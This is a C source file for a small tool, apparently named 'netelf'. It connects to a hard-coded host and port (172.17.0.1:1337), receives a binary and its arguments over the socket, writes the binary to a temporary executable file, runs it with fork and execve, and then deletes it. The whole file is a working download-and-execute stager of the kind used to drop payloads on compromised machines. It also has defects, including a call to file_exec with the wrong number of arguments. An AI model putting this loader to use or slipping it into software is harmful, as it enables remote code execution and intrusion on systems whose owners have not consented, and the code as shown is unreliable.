#ifndef _WIN32
/* UNIX-like/compatible platforms */
# include <fcntl.h>
# include <stdio.h> 
# include <stdlib.h> 
# include <sys/stat.h> 
# include <string.h>
# include <errno.h>
# include <sys/mman.h> 
# include <unistd.h> 
# include <arpa/inet.h>
# include <netinet/in.h>
# include <sys/socket.h>
#endif

#if defined(__unix__) || defined(unix)
# define USE_FORK
#endif

#ifdef __VMS_VER
# define USE_VFORK
#endif


/*
* NETELF_ERROR is used to cause a compile error when
* we can't rely on the preprocessor... e.g. when #error
* causes a syntax error...
*/
#define NETELF_ERROR 0
#ifndef _WIN32
# if !defined(USE_FORK) && !defined(USE_VFORK)
#  undef NETELF_ERROR 
#  define NETELF_ERROR unknown_fork_or_vfork
# endif
#endif

static int _netelf_error = NETELF_ERROR;

#ifdef _WIN32
# include "_win32.c"
#endif

#ifdef __linux__
# include "_linux.c"
#endif

#ifdef NETELF_NEED_LIB_C
# include "_lib.c"
#endif


#ifndef NETELF_OVERRIDE_FILE

/*
* POSIX-style portable file handle
* used to write to the file, then execute it
*/
struct ne_file_s {
	char *name;
	int handle;
};
typedef struct ne_file_s ne_file_t;


static int
file_open(file)
	ne_file_t *file;
{
	int handle;
#ifdef USE_TMPNAM
	char *filename = tmpnam("XXXXXX");
#else
	char *filename = tempnam(NULL, NULL);
#endif

	handle = open(filename, O_CREAT | O_WRONLY, 0700);
	if (handle == -1) {
		return 1;
	}

	file->handle = handle;
	file->name = filename;
	return 0;
}


static unsigned int
file_write(file, buf, nbytes)
	ne_file_t *file;
	void *buf;
	unsigned int nbytes;
{
	return write(file->handle, buf, nbytes);
}


static int
file_exec(file, argv)
	ne_file_t *file;
	char **argv;
{
	pid_t child_pid = 0;
    extern char **environ;

	close(file->handle);

# ifdef USE_VFORK
	child_pid = vfork();
# endif
# ifdef USE_FORK
	child_pid = fork();
# endif

	if (child_pid == 0) {
		if (-1 == execve(file->name, argv, environ)) {
#ifndef QUIET
			perror("execve");
#endif
			unlink(file->name);
			return 6;
		}
	}
	
	sleep(1);
	unlink(file->name);	

	return 0;
}

#endif
/* !NETELF_OVERRIDE_FILE */


static int
sock_connect( ip, port )
	char *ip;
	int port;
{
    struct sockaddr_in serv_addr; 
    int sockfd;

#ifdef _WIN32
    WSADATA wsadata;
    if( WSAStartup(MAKEWORD(2,0), &wsadata) != 0 ) {
        return -1;
    }
#endif

    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if( sockfd < 0 )
        return sockfd;

#ifdef _WIN32
	ZeroMemory(&serv_addr, sizeof(serv_addr));
#else
    memset(&serv_addr, 0, sizeof(serv_addr));
#endif
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);

#ifdef HAVE_INET_PTON
	if (inet_pton(AF_INET, ip, &serv_addr.sin_addr) <= 0) {
		return -1;
	}
#else
    serv_addr.sin_addr.s_addr = inet_addr(ip);
    if( serv_addr.sin_addr.s_addr == INADDR_NONE ) {
        return -1;
    }
#endif

    if( connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0 ) {
        return -2;
    }

    return sockfd;
}


static unsigned int
sock_read( sockfd, buf, nbytes )
    int sockfd;
    char *buf;
    unsigned int nbytes;
{
    int rc;
#ifdef USE_RECV
    rc = recv(sockfd, buf, nbytes, 0); 
#else
    rc = read(sockfd, buf, nbytes); 
#endif

    return rc;
}


static unsigned int
sock_readbytes( sockfd, buf, nbytes )
	int sockfd;
	char *buf;
	unsigned int nbytes;
{
    int rc;
    unsigned int nbread = 0;
    while( nbread < nbytes ) { 
        rc = sock_read(sockfd, buf, nbytes - nbread); 
        if (rc < 0) {         
            return 0;
        }
        buf += rc;
        nbread += rc;
    }
    return nbread;
}


static void
sock_close(sockfd)
	int sockfd;
{
#ifdef _WIN32
	closesocket(sockfd);
#else
	close(sockfd);
#endif
}


static unsigned int
sock_readint( sockfd )
	int sockfd;
{
    unsigned int ret = 0;
    if( sock_readbytes(sockfd, (void*)&ret, 4) != 4 ) {
        return 0;
    }
    return ntohl(ret);
}


static char **
sock_argv( sockfd, argc )
	int sockfd;
    unsigned int *argc;
{
    char *data = NULL;
    char *bufstart;
    unsigned int nbytes = sock_readint(sockfd);
    unsigned int nargs;
    unsigned int args_sz;
    char **args;
    if( ! nbytes ) {
#ifndef QUIET
        perror("Error reading nbytes\n");
#endif
        return NULL;
    }

    nargs = sock_readint(sockfd);
    if( ! nargs ) {
#ifndef QUIET
        perror("Error reading nargs\n");
#endif
        return NULL;
    }
    if( argc )
        *argc = nargs;

    args_sz = nargs * sizeof(char*);
    data = (char *)malloc(args_sz + nbytes);
    if( ! data )
        return NULL;

    args = (char**)&data[0];
    bufstart = &data[args_sz];
    while( nargs-- ) {        
        unsigned int val = sock_readint(sockfd);
        if( val ) {
            args[nargs] = &bufstart[val];
        }
        else {
            args[nargs] = NULL;
        }
    }

    if( ! sock_readbytes(sockfd, bufstart, nbytes) ) {
        free(data);
        return NULL;
    }

    return (char**)data;
}


static int
sock_exec_impl( sockfd, nbytes, argc, argv )
	int sockfd;
	unsigned int nbytes;
    unsigned int argc;
	char **argv;
{
	ne_file_t outfile;
    char buf[1024];
    unsigned int nread;
    unsigned int ntoread;
    unsigned int nwritten;
	
    if( file_open(&outfile) ) {
#ifndef QUIET
		perror("file_open");
#endif
        return 3;
    }

    while( nbytes ) {
        ntoread = (nbytes > sizeof(buf)) ? sizeof(buf) : nbytes;
        nread = sock_readbytes(sockfd, buf, ntoread);
        if( ! nread ) {
            return 4;
        }
        nwritten = file_write(&outfile, buf, nread);
        if( nread != nwritten ) {
            return 5;
        }
        nbytes -= nwritten;
    }

	return file_exec(&outfile, argc, argv);
}


static int
sock_exec( sockfd )
	int sockfd;
{
    unsigned int argc;
    char **argv;
    unsigned int nbytes;

    argv = sock_argv(sockfd, &argc);
    if( ! argv ) {
#ifndef QUIET
        perror("Cannot read argv\n");
#endif
        return 1;
    }

    nbytes = sock_readint(sockfd);
    if( ! nbytes ) {
#ifndef QUIET
		perror("Cannot read bytes\n");
#endif
        return 2;
    }

    return sock_exec_impl(sockfd, nbytes, argc, argv);
}


static int
run_netelf(ip_addr, port)
	const char *ip_addr;
	int	port;
{
	int rc = -1;
	int sockfd;

    sockfd = sock_connect(ip_addr, port);
    if( sockfd < 0 ) {
#ifndef QUIET
        perror("sock_connect");
#endif
        return 2;
    }

    rc = sock_exec(sockfd);
    sock_close(sockfd);
    return rc;
}


#ifndef NETELF_NO_MAIN

int
main(argc, argv)
	int argc;
	char **argv;
{
	const char *ip_addr = "172.17.0.1";
	int port = 1337;	
	if (argc > 1) {
		ip_addr = argv[1];
		if (argc > 2) {
			port = atoi(argv[2]);
		}
	}
	return run_netelf(ip_addr, port);
}

#endif
